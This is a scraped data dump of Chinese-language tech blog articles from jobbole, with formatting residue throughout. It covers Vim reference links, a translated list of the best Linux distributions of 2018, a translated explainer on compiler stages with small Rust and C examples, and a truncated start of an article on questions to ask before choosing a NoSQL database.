“Vim 25” (lecture, Zurich, November 2, 2016), December 13, 2016, accessed August 5, 2018, ,https://www.youtube.com/watch?v=ayc_qpB-93o&t=4m58,s,\n,ibid. (?t=6m15s),\n,ibid. (?t=7m6s),\n,“Fish Disks 1 – 1120,” Amiga Stuff, accessed August 5, 2018, ,http://www.amiga-stuff.com/pd/fish.html,.,\n,“2005 Linux Journal Reader’s Choice Awards,” Linux Journal, September 28, 2005, accessed August 5, 2018, ,https://www.linuxjournal.com/article/8520#N0x850cd80.0x87983bc,.,\n,“Stack Overflow Developer Survey 2018,” Stack Overflow, accessed August 5, 2018, ,https://insights.stackoverflow.com/survey/2018/#development-environments-and-tools,.,\n,Bruce Byfield, “The End of the Editor Wars,” Linux Magazine, May 11, 2015, accessed August 5, 2018, ,http://www.linux-magazine.com/Online/Blogs/Off-the-Beat-Bruce-Byfield-s-Blog/The-End-of-the-Editor-Wars,.,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,Abandon_first,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            人。        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 1,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114461/", "url_object_id": "503ae7fbe22cb704c56f29af0f417fa6", "front_image_path": "full/4c6abd763d27eeeb4c7e7665f213388ec74df623.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/22b50c4f6378466a0259ad8ceeedd1ed.jpg"], "title": "2018 年最好的 Linux 发行版", "create_time": "2018/10/28", "vote": "2", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Jack Wallen,   译文出处：,Linux中国/dianbanjiu,   ,\n,Jack Wallen 分享他挑选的 2018 年最好的 Linux 发行版。,\n,这是新的一年，Linux 仍有无限可能。而且许多 Linux 发行版在 2017 年都带来了许多重大的改变，我相信在 2018 年它在服务器和桌面上将会带来更加稳定的系统和市场份额的增长。,\n,对于那些期待迁移到开源平台（或是那些想要切换到）的人对于即将到来的一年，什么是最好的选择？如果你去 ,Distrowatch, 找一下，你可能会因为众多的发行版而感到头晕，其中一些的排名在上升，而还有一些则恰恰相反。,\n,因此，哪个 Linux 发行版将在 2018 年得到偏爱？我有我的看法。事实上，我现在就要和你们分享它。,\n,跟我做的 ,去年清单, 相似，我将会打破那张清单，使任务更加轻松。普通的 Linux 用户，至少包含以下几个类别：系统管理员，轻量级发行版，桌面，为物联网和服务器发行的版本。,\n,根据这些，让我们开始 2018 年最好的 Linux 发行版清单吧。,\n,对系统管理员最好的发行版,\n,Debian, 不常出现在“最好的”列表中。但它应该出现，为什么呢？如果了解到 Ubuntu 是基于 Debian 构建的（其实有很多的发行版都基于 Debian），你就很容易理解为什么这个发行版应该在许多“最好”清单中。但为什么是对管理员最好的呢？我想这是由于两个非常重要的原因：,\n,\n,容易使用,\n,非常稳定,\n,\n,因为 Debain 使用 dpkg 和 apt 包管理，它使得使用该环境非常简单。而且因为 Debian 提供了最稳定的 Linux 平台之一，它为许多事物提供了理想的环境：桌面、服务器、测试、开发。虽然 Debian 可能不包括去年本分类的优胜者 ,Parrot Linux, 所带有的大量应用程序，但添加完成任务所需的任何或全部必要的应用程序都非常容易。而且因为 Debian 可以根据你的选择安装不同的桌面（Cinnamon、GNOME、KDE、LXDE、Mate 或者 Xfce），肯定可以满足你对桌面的需求。,\n,\n,图 1：在 Debian 9.3 上运行的 GNOME 桌面。,\n,同时，Debain 在 Distrowatch 上名列第二。下载、安装，然后让它为你的工作而服务吧。Debain 尽管不那么华丽，但是对于管理员的工作来说十分有用。,\n,最轻量级的发行版,\n,轻量级的发行版有其特殊的用途：给予一些老旧或是性能低下的机器以新生。但是这不意味着这些特别的发行版仅仅只为了老旧的硬件机器而生。如果你想要的是运行速度，你可能会想知道在你的现代机器上这类发行版的运行速度能有多快。,\n,在 2018 年上榜的最轻量级的发行版是 ,Lubuntu,。尽管在这个类别里还有很多选择，而且尽管 Lubuntu 的资源占用与 Puppy Linux 一样小，但得益于它是 Ubuntu 家庭的一员，其易用性为它加了分。但是不要担心，Lubuntu 对于硬件的要求并不高：,\n,\n,CPU：奔腾 4 或者奔腾 M 或者 AMD K8 以上,\n,对于本地应用，512 MB 的内存就可以了，对于网络使用（Youtube、Google+、Google Drive、Facebook），建议 1 GB 以上。,\n,\n,Lubuntu 使用的是 LXDE 桌面（图 2），这意味着新接触 Linux 的用户在使用这个发行版时不会有任何问题。这份简短清单中包含的应用（例如：Abiword、Gnumeric 和 Firefox）都是非常轻量的，且对用户友好的。,\n,\n,图 2：LXDE桌面。,\n,Lubuntu 能让十年以上的电脑如获新生。,\n,最好的桌面发行版,\n,Elementary OS, 连续两年都是我清单中最好的桌面发行版。对于许多人，,Linux Mint, （也是一个非常棒的分支）都是桌面发行版的领袖。但是，于我来说，它在易用性和稳定性上很难打败 Elementary OS。例如，我确信是 ,Ubuntu, 17.10 的发布让我迁移回了 Canonical 的发行版。迁移到新的使用 GNOME 桌面的 Ubuntu 不久之后，我发现我缺少了 Elementary OS 外观、可用性和感觉（图 3）。在使用 Ubuntu 两周以后，我又换回了 Elementary OS。,\n,\n,图 3：Pantheon 桌面是一件像艺术品一样的桌面。,\n,使用 Elementary OS 的任何一个人都会觉得宾至如归。Pantheon 桌面是将操作顺滑和用户友好结合的最完美的桌面。每次更新，它都会变得更好。,\n,尽管 Elementary OS 在 Distrowatch 页面访问量中排名第六，但我预计到 2018 年末，它将至少上升至第三名。Elementary 开发人员非常关注用户的需求。他们倾听并且改进，这个发行版目前的状态是如此之好，似乎他们一切都可以做的更好。 如果您需要一个具有出色可靠性和易用性的桌面，Elementary OS 就是你的发行版。,\n,能够证明自己的最好的发行版,\n,很长一段时间内，,Gentoo, 都稳坐“展现你技能”的发行版的首座。但是，我认为现在 Gentoo 是时候让出“证明自己”的宝座给 ,Linux From Scratch（LFS）,。你可能认为这不公平，因为 LFS 实际上不是一个发行版，而是一个帮助用户创建自己的 Linux 发行版的项目。但是，有什么能比你自己创建一个自己的发行版更能证明自己所学的 Linux 知识的呢？在 LFS 项目中，你可以从头开始构建自定义的 Linux 系统，而且是从源代码开始。 所以，如果你真的想证明些什么，请下载 ,Linux From Scratch Book, 并开始构建。,\n,对于物联网最好的发行版,\n,Ubuntu Core, 已经是第二年赢得了该项的冠军。Ubuntu Core 是 Ubuntu 的一个小型的、事务型版本，专为嵌入式和物联网设备而构建。使 Ubuntu Core 如此完美支持物联网的原因在于它将重点放在 snap 包上 —— 这种通用包可以安装到一个平台上而不会干扰其基本系统。这些 snap 包包含它们运行所需的所有内容（包括依赖项），因此不必担心安装它会破坏操作系统（或任何其他已安装的软件）。 此外，snap 包非常容易升级，并运行在隔离的沙箱中，这使它们成为物联网的理想解决方案。,\n,Ubuntu Core 内置的另一个安全领域是登录机制。Ubuntu Core 使用Ubuntu One ssh密钥，这样登录系统的唯一方法是通过上传的 ssh 密钥到 ,Ubuntu One帐户,（图 4）。这为你的物联网设备提供了更高的安全性。,\n,\n,图 4：Ubuntu Core屏幕指示通过Ubuntu One用户启用远程访问。,\n,最好的服务器发行版,\n,这里有点意见不统一。主要原因是支持。如果你需要商业支持，乍一看，你最好的选择可能是 ,Red Hat Enterprise Linux,。红帽年复一年地证明了自己不仅是全球最强大的企业服务器平台之一，而且是单一最赚钱的开源业务（年收入超过 20 亿美元）。,\n,但是，Red Hat 并不是唯一的服务器发行版。 实际上，Red Hat 甚至并不能垄断企业服务器计算的各个方面。如果你关注亚马逊 Elastic Compute Cloud 上的云统计数据，Ubuntu 就会打败红帽企业 Linux。根据,云市场,的报告，EC2 统计数据显示 RHEL 的部署率低于 10 万，而 Ubuntu 的部署量超过 20 万。,\n,最终的结果是，Ubuntu 几乎已经成为云计算的领导者。如果你将它与 Ubuntu 对容器的易用性和可管理性结合起来，就会发现 Ubuntu Server 是服务器类别的明显赢家。而且，如果你需要商业支持，Canonical 将为你提供 ,Ubuntu Advantage,。,\n,对使用 Ubuntu Server 的一个警告是它默认为纯文本界面（图 5）。如果需要，你可以安装 GUI，但使用 Ubuntu Server 命令行非常简单（每个 Linux 管理员都应该知道）。,\n,\n,图 5：Ubuntu 服务器登录，通知更新。,\n,你怎么看,\n,正如我之前所说，这些选择都非常主观，但如果你正在寻找一个好的开始，那就试试这些发行版。每一个都可以用于非常特定的目的，并且比大多数做得更好。虽然你可能不同意我的个别选择，但你可能会同意 Linux 在每个方面都提供了惊人的可能性。并且，请继续关注下周更多“最佳发行版”选秀。,\n,通过 Linux 基金会和 edX 的免费,“Linux 简介”,课程了解有关Linux的更多信息。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114473/", "url_object_id": "d19d16854cc8aac90eb50785ce0e89f5", "front_image_path": "full/835dea16bfc384fe2e59c8297ac5166f44525df3.jpg"},{"front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3ly1fwjgiwii9lj20qn0gqdgl.jpg"], "title": "人人都能读懂的编译器原理", "create_time": "2018/11/01", "vote": "3", "bookmark": "8", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,可乐, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Luke Wilson,。欢迎加入,翻译组,。,编程语言是怎样工作的,\n,理解编译器内部原理，可以让你更高效利用它。按照编译的工作顺序，逐步深入编程语言和编译器是怎样工作的。本文有大量的链接、样例代码和图表帮助你理解编译器。,\n,作者注：,\n,这是我在 Medium 上的第二篇文章的再版，,上一版,有超过 21000 的阅读量。很高兴我能够帮助到各位的学习，,因此我根据上一版的评论，完完全全重写了。,\n,我选择 Rust 作为这篇文章的主要语言。它是一种详尽的、高效的、现代的而且看起来特意使得设计编译器变得简单。我很喜欢使用它。 ,https://www.rust-lang.org/,\n,写这篇文章的目的主要是吸引读者的注意力，而不是提供 20 多页的令人头皮发麻的阅读材料。对于那些你感兴趣的更深层次的话题，文章中有许多链接会引导你找到相关的资料。大多数链接到维基百科 。,\n,感谢你的关注，我希望你能够喜欢这些我花费了超过 20 个小时的写出的文章。欢迎在文章底部评论处留下任何问题或者建议。,\n,简单介绍,\n,编译器是什么？,\n,你口中所说的编程语言本质上只是一个软件，这个软件叫做编译器，编译器读入一个文本文件，经过大量的处理，最终产生一个二进制文件。, 编译器的语言部分就是它处理的文本样式。因为电脑只能读取 1 和 0 ，而人们编写 Rust 程序要比直接编写二进制程序简单地多，因此编译器就被用来把人类可读的文本转换成计算机可识别的机器码。,\n,编译器可以是任何可以把文本文件转换成其他文件的程序。例如，下面有一个用 Rust 语言写的编译器把 0 转换成 1，把 1 转换成 0 ：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// An example compiler that turns 0s into 1s, and 1s into 0s.\r\n\r\nfn main() {\r\n    let input = \"1 0 1 A 1 0 1 3\";\r\n\r\n    // iterate over every character `c` in input\r\n    let output: String = input.chars().map(|c|\r\n        if c == '1' { '0' }\r\n        else if c == '0' { '1' }\r\n        else { c } // if not 0 or 1, leave it alone\r\n    ).collect();\r\n\r\n    println!(\"{}\", output); // 0 1 0 A 0 1 0 3\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// An example compiler that turns 0s into 1s, and 1s into 0s., ,fn ,main,(,), ,{,    ,let ,input, ,=, ,\"1 0 1 A 1 0 1 3\",;, ,    ,// iterate over every character `c` in input,    ,let ,output,:, ,String, ,=, ,input,.,chars,(,),.,map,(,|,c,|,        ,if, ,c, ,==, ,'1', ,{, ,'0', ,},        ,else, ,if, ,c, ,==, ,'0', ,{, ,'1', ,},        ,else, ,{, ,c, ,}, ,// if not 0 or 1, leave it alone,    ,),.,collect,(,),;, ,    ,println,!,(,\"{}\",,, ,output,),;, ,// 0 1 0 A 0 1 0 3,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,编译器是做什么的？,\n,简言之，编译器获取源代码，产生一个二进制文件。因为从复杂的、人类可读的代码直接转化成0/1二进制会很复杂，所以编译器在产生可运行程序之前有多个步骤：,\n,\n,从你给定的源代码中读取单个词。,\n,把这些词按照单词、数字、符号、运算符进行分类。,\n,通过模式匹配从分好类的单词中找出运算符，明确这些运算符想进行的运算，然后产生一个运算符的树（表达式树）。,\n,最后一步遍历表达式树中的所有运算符，产生相应的二进制数据。,\n,\n,尽管我说编译器直接从表达式树转换到二进制，但实际上它会产生汇编代码，之后汇编代码会被汇编/编译到二进制数据。汇编程序就好比是一种高级的、人类可读的二进制。更多关于汇编语言的阅读资料在,这里,。,\n,\n,解释器是什么？,\n,解释器, 非常像编译器，它也是读入编程语言的代码，然后处理这些代码。尽管如此，,解释器会跳过了代码生成，然后,即时编译,并执行 AST。, 解释器最大的优点就在于在你 debug 期间运行程序所消耗的时间。编译器编译一个程序可能在一秒到几分钟不等，然而解释器可以立即开始执行程序，而不必编译。解释器最大的缺点在于它必须安装在用户电脑上，程序才可以执行。,\n,\n,虽然这篇文章主要是关于编译器的，但是对于编译器和解释器之间的区别和编译器相关的内容一定要弄清楚。,\n,1. 词法分析,\n,第一步是把输入一个词一个词的拆分开。这一步被叫做 ,词法分析,,或者说是分词。这一步的关键就在于 ,我们把字符组合成我们需要的单词、标识符、符号等等。, 词法分析大多都不需要处理逻辑运算像是算出 ,2+2, – 其实这个表达式只有三种 ,标记,：一个数字：,2,,一个加号，另外一个数字：,2,。,\n,让我们假设你正在解析一个像是 ,12+3, 这样的字符串：它会读入字符 ,1,，,2,，,+,，和 ,3,。我们已经把这些字符拆分开了，但是现在我们必须把他们组合起来；这是分词器的主要任务之一。举个例子，我们得到了两个单独的字符 ,1, 和 ,2,，但是我们需要把它们放到一起，然后把它们解析成为一个整数。至于 ,+,也需要被识别为加号，而不是它的字符值 – 字符值是43 。,\n,如果你可以阅读过上面的代码，并且弄懂了这样做的含义，接下来的 Rust 分词器会组合数字为32位整数，加号就最后了标记值 Plus（加）.,\n,rust playground,\n,你可以点击 Rust playgroud 左上角的 “Run” 按钮来编译和执行你浏览器中的代码。,\n,在一种编程语言的编译器中，词法解析器可能需要许多不同类型的标记。例如：符号，数字，标识符，字符串，操作符等。想知道要从源文件中提取怎样的标记完全取决于编程语言本身。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nint main() {\r\n    int a;\r\n    int b;\r\n    a = b = 4;\r\n    return a - b;\r\n}\r\n\r\nScanner production:\r\n[Keyword(Int), Id(\"main\"), Symbol(LParen), Symbol(RParen), Symbol(LBrace), Keyword(Int), Id(\"a\"), Symbol(Semicolon), Keyword(Int), Id(\"b\"), Symbol(Semicolon), Id(\"a\"), Operator(Assignment), Id(\"b\"),\r\nOperator(Assignment), Integer(4), Symbol(Semicolon), Keyword(Return), Id(\"a\"), Operator(Minus), Id(\"b\"), Symbol(Semicolon), Symbol(RBrace)],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,int, ,main,(,), ,{,    ,int, ,a,;,    ,int, ,b,;,    ,a, ,=, ,b, ,=, ,4,;,    ,return, ,a, ,-, ,b,;,}, ,Scanner ,production,:,[,Keyword,(,Int,),,, ,Id,(,\"main\",),,, ,Symbol,(,LParen,),,, ,Symbol,(,RParen,),,, ,Symbol,(,LBrace,),,, ,Keyword,(,Int,),,, ,Id,(,\"a\",),,, ,Symbol,(,Semicolon,),,, ,Keyword,(,Int,),,, ,Id,(,\"b\",),,, ,Symbol,(,Semicolon,),,, ,Id,(,\"a\",),,, ,Operator,(,Assignment,),,, ,Id,(,\"b\",),,,Operator,(,Assignment,),,, ,Integer,(,4,),,, ,Symbol,(,Semicolon,),,, ,Keyword,(,Return,),,, ,Id,(,\"a\",),,, ,Operator,(,Minus,),,, ,Id,(,\"b\",),,, ,Symbol,(,Semicolon,),,, ,Symbol,(,RBrace,),],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,C 语言的样例代码已经进行过词法分析，并且输出了它的标记。,\n,2. 解析,\n,解析器确实是语法解析的核心。,解析器提取由词法分析器产生的标记，并尝试判断它们是否符合特定的模式，然后把这些模式与函数调用，变量调用，数学运算之类的表达式关联起来。, 解析器逐词地定义编程语言的语法。,\n,int a = 3, 和 ,a: int = 3, 的区别在于解析器的处理上面。解析器决定了语法的外在形式是怎样的。它确保括号和花括号的左右括号是数量平衡的，每个语句结尾都有一个分号，每个函数都有一个名称。当标记不符合预期的模式时，解析器就会知道标记的顺序不正确。,\n,你可以写好几种不同,类型的解析器,。最常见的解析器之一是从上到下的，,递归降解的解析器,。递归降解的解析器是用起来最简单也是最容易理解的解析器。我写的所有解析器样例都是基于递归降解的。,\n,解析器解析的语法可以使用一种 ,语法, 表示出来。像 ,EBNF, 这样的语法就可以描述一个解析器用于解析简单的数学运算，像是这样 ,12+3, :,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nexpr = additive_expr ;\r\nadditive_expr = term, ('+' | '-'), term ;\r\nterm = number ;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,expr, ,=, ,additive,_,expr, ,;,additive_expr, ,=, ,term,,, ,(,'+', ,|, ,'-',),,, ,term, ,;,term, ,=, ,number, ,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,简单加法和减法表达式的 EBNF 语法。,请记住语法文件,并不是,解析器，但是它确实是解析器的一种表达形式。你可以围绕上面的语法创建一个解析器。语法文件可以被人使用并且比起直接阅读和理解解析器的代码要简单许多。\n,那种语法的解析器应该是 ,expr, 解析器，因为它直接与所有内容都相关的顶层。唯一有效的输入必须是任意数字，加号或减号，任意数字。,expr, 需要一个 ,additive_expr,,这主要出现在加法和减法表达式中。,additive_expr, 首先需要一个 ,term, （一个数字），然后是加号或者减号，最后是另一个 ,term, 。,\n, ,\n,\n解析 12+3 产生的样例 AST,解析器在解析时产生的树状结构被称为 ,抽象的语法树,，或者称之为 AST。, ast 中包含了所有要进行操作。解析器不会计算这些操作，它只是以正确的顺序来收集其中的标记。\n,我之前补充了我们的词法分析器代码，以便它与我们的语法想匹配，并且可以产生像图表一样的 AST。我用 ,// BEGIN PARSER //, 和 ,// END PARSER //, 的注释标记出了新的解析器代码的开头和结尾。,\n,rust playground,\n,我们可以再深入一点。假设我们想要支持只有数字没有运算符的输入，或者添加除法和乘法，甚至添加优先级。只要简单地修改一下语法文件，这些都是完全有可能的，任何调整都会直接反映在我们的解析器代码中。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nexpr = additive_expr ;\r\nadditive_expr = multiplicative_expr, { ('+' | '-'), multiplicative_expr } ;\r\nmultiplicative_expr = term, { (\"*\" | \"/\"), term } ;\r\nterm = number ;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,expr, ,=, ,additive,_,expr, ,;,additive_expr, ,=, ,multiplicative_expr,,, ,{, ,(,'+', ,|, ,'-',),,, ,multiplicative,_,expr, ,}, ,;,multiplicative_expr, ,=, ,term,,, ,{, ,(,\"*\", ,|, ,\"/\",),,, ,term, ,}, ,;,term, ,=, ,number, ,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,新的语法。,https://play.rust-lang.org/?gist=1587a5dd6109f70cafe68818a8c1a883&version=nightly&mode=debug&edition=2018\n,\n, ,\n,针对 C 语言语法编写的解析器（又叫做词法分析器）和解析器样例。从字符序列的开始 “if(net>0.0)total+=net(1.0+tax/100.0);”,扫描器组成了一系列标记，并且对它们进行分类，例如，标识符，保留字，数字，或者运算符。后者的序列由解析器转换成语法树，然后由其他的编译器分阶段进行处理。扫描器和解析器分别处理 C 语法中的规则和与上下文无关的部分。引自：Jochen Burghardt.,来源,.,\n,3. 生成代码,\n,代码生成器, 接收一个 AST ,然后生成相应的代码或者汇编代码。代码生成器必须以递归下降的顺序遍历AST中的所有内容-就像是解析器的工作方式一样-之后生成相应的内容，只不过这里生成的不再是语法树，而是代码了。,\n,https://godbolt.org/z/K8416_,\n,如果打开上面的链接，你就可以看到左侧样例代码产生的汇编代码。汇编代码的第三行和第四行展示了编译器在AST中遇到常量的时候是怎样为这些常量生成相应的代码的。,\n,Godbolt Compiler Explorer 是一个很棒的工具，允许你用高级语言编写代码，并查看它产生的汇编代码。你可以有点晕头转向了，想知道产生的是哪种代码，但不要忘记给你的编程语言编译器添加优化选项来看看它到底有多智能。（对于 Rust 是 ,-O, ）,\n,如果你对于编译器是在汇编语言中怎样把一个本地变量保存到内存中感兴趣的话，,这篇文章, （“代码生成”部分）非常详细地解释了堆栈的相关知识。大多数情况下，当变量不是本地变量的时候，高级编译器会在堆区为变量分配空间，并把它们保存到堆区，而不是栈区。你可以从,这个 StackOverflow 的回答上,阅读更多关于变量存储的内容。,\n,因为汇编是一个完全不同的，而且复杂的主题，因此这里我不会过多地讨论它。我只是想强调代码生成器的重要性和它的作用。此外，代码生成器不仅可以产生汇编代码。,Haxe, 编译器有一个可以产生 6 种以上不同的编程语言的,后端,：包括 C++,Java,和 Python。,\n,后端指的是编译器的代码生成器或者表达式解析器；因此前端是词法分析器和解析器。同样也有一个中间端，它通常与优化和 IR 有关，这部分会在稍后解释。后端通常与前端无关，后端只关心它接收到的 AST。这意味着可以为几种不同的前端或者语言重用相同的后端。大名鼎鼎的 ,GNU Compiler Collection, 就属于这种情况。,\n,我找不到比我的 C 编译器后端更好的代码生成器示例了；你可以在,这里,查看。,\n,在生成汇编代码之后，这些汇编代码会被写入到一个新的汇编文件中 (,.s, 或 ,.asm,)。然后该文件会被传递给汇编器，汇编器是汇编语言的编译器，它会生成相应的二进制代码。之后这些二进制代码会被写入到一个新的目标文件中 (,.o,) 。,\n,目标文件是机器码，但是它们并不可以被执行。, 为了让它们变成可执行文件，目标文件需要被链接到一起。链接器读取通用的机器码，然后使它变为一个可执行文件、,共享库,或是 ,静态库,。更多关于链接器的知识在,这里,。,\n,链接器是因操作系统而不同的应用程序。随便一个第三方的链接器都应该可以编译你后端产生的目标代码。因此在写编译器的时候不需要创建你自己的链接器。,\n,\n,编译器可能有 ,中间表示,,或者简称 IR 。,IR 主要是为了在优化或者翻译成另一门语言的时候，无损地表示原来的指令。, IR 不再是原来的代码；IR 是为了寻找代码中潜在的优化而进行的无损简化。,循环展开, 和 ,向量化, 都是利用 IR 完成的。更多关于 IR 相关的优化可以在这个 ,PDF, 中找到。,\n,总结,\n,当你理解了编译器的时候，你就可以更有效地使用你的编程语言。或许有一天你会对创建你自己的编程语言感兴趣？我希望这能够帮到你。,\n,资源&更深入的阅读资料,\n,\n,http://craftinginterpreters.com/, – 指导你编写一个 C 和 Java 的解释器。,\n,https://norasandler.com/2017/11/29/Write-a-Compiler.html, – 大概是对我来说最有用的 “编写编译器” 的教程了,\n,我的 C 编译器和科学计算解析器可以在,这里,和,这里,找到。,\n,另一类的解析器，被称作自底向上的解析器,可以在,这里,找到。来源于：Wesley Norris.,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,3, 赞,\n        , 8 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,可乐,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            本科在读，对python,linux,安全很感兴趣，希望能够阅读国外最新的技术新闻，也希望能够翻译一些文章帮助到别人        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 13, · , , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114466/", "url_object_id": "66d853efc56bcb1bdc594f4a6e4f1542", "front_image_path": "full/1a3b782e3cc89fc8c0111e8f9fde255c403dc1bd.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/02/NoSQL-Not-Only-SQL.jpg"], "title": "选择 NoSQL 数据库需要考虑的 10 个问题", "create_time": "2018/10/08", "vote": "2", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Deb Haldar,   译文出处：,开源中国,   ,那么我为什么要写这篇文章呢？,\n,是因为我认为NoSQL解决方案不如RDBMS解决方案吗？当然不!,\n,是因为我专注于SQL的做事方式，而不想陷入一种相对较新的技术的不确定性吗？不，也不是！事实上，我非常兴奋地学习和使用各种分布式数据库提供的设施。,\n,那我为什么要写这个？,\n,原因很简单——几年前，我见证了设计一个为遥测事件提供模式管理设施的系统。事实证明，这比最初计划的要昂贵得多。为什么呢？因为选择了错误的数据库解决方案。,\n,这个系统的一个要求是确保模式编辑是一致的，并且模式的最新版本被显示给每个模式编辑器。它还应该支持并发编辑。,\n,此外，同时访问这个系统的用户数量永远不会超过几百个。存储的数据量不会是Tb级——最多几百Gb。,\n,因此，如果我们考虑了,CAP定理,的权衡，那么选择应该是显而易见的——使用RDBMS。这样做的好处是支持系统的一致性和事务支持需求。,\n,相反，选择了NoSQL数据库（,Azure表存储,）来进行原型设计。这一选择的官方原因是，它使原型设计更快，并提供了更大的灵活性，同时更新了单个遥测事件的模式。与Azure SQL相比，Azure表存储的低成本被认为是另一个原因。,\n, ,\n,快进5个月……,\n,该系统开始经历许多关于维护CRUD操作完整性的问题。设计用来处理事务的瘦应用程序逻辑层已经不再那么薄了。升级和向后兼容性的故事开始变得更加复杂。,\n,由于受到许多其他问题的困扰，工程师们又回到了绘图板——这次是用Azure SQL替换存储层！我不记得具体的细节，但是这个改变增加了大约40%的额外时间和成本。,\n,管理层很不高兴，这个项目几乎被砍掉了。但是团队的工程师们非常优秀，他们能够完成这个项目，尽管有了一些延迟和最初的错误的技术决定。,\n,这个项目有一个圆满的结局——但它也可能不是这样的。事实上，很多内部项目都被关闭了，因为他们不能在承诺的日期范围内交付承诺的功能。,\n,那么，您如何知道NoSQL解决方案适合您的下一个软件项目呢？首先问问你自己和你的团队这十个问题：,\n,#1：您是否准备好接受开发人员/系统管理员的培训成本？,\n,如果你是一家成熟的IT软件开发公司，那么你很有可能已经有了熟悉SQL的人。这个组不仅包括开发人员，还包括数据库管理员（DBA）。,\n,除非您打算为新的NoSQL项目进行招聘，否则将会有对现有开发人员和DBA的培训成本。额外的培训也可能会延长项目交付日期。,\n,一种简单的思考方式是：,\n,\n,计算您的团队成员（开发人员和DBA）拥有关系数据库技术的总年数。,\n,计算出通过培训或新招聘获得经验相同NoSQL经验年数的成本。,\n,最后，弄清楚你从这个成本中得到了什么。你的投资回报率？,\n,\n,在这个特定的项目中，这个团队的开发人员以前都没有NoSQL经验，但是有大量的SQL Server经验。使用NoSQL解决方案在培训中增加了大约1个sprint，当然，这也是由于缺乏经验和设计上的失误。,\n,#2：您的数据事务是基于什么？或者，您需要什么级别的事务支持？,\n,如果您的系统需要ACID属性，那么您最好还是坚持使用RDBMS解决方案。否则，您将花费大量的时间试图在您的应用程序/业务逻辑层复制ACID保证，并且您可能仍然没有RDBMS解决方案那么高效。,\n,#3: 您需要Web/高可伸缩性吗？,\n,总是在先计算出您需要什么样的可伸缩性。在这个特殊的例子中，我们正在为微软内部游戏工作室构建系统。,\n,\n,有10到15个游戏工作室正在考虑中——这取决于有多少注册用户使用这个系统,\n,每个工作室最多有3-5个活跃的游戏标题。,\n,每个游戏标题为三个环境存储遥测模式——开发、预生产（PPE）和生产,\n,对于每个标题，将会有2-5个数据科学家同时修改游戏标题数据,\n,每一个标题事件都有大约50 KB的max事件数据,\n,我们被要求存储所有的版本——我们估计这个数字是1000除以一个标题的生命周期,\n,\n,有了以上粗略的估计，我们就可以计算并发性和存储需求：,\n,总并发数 = 工作室数量 * 标题数量每工作室 * 用户数量每标题,\n,=  15 * 5 * 5 = ,375 并发用户,\n,最大存储 =  工作室数量 * 标题数量每工作室 * 环境数量 * 事件存储大小每版本* 需要存储的版本数,\n,= 15 * 5 * 3 * 50 KB * 1000 = 11250000 KB = 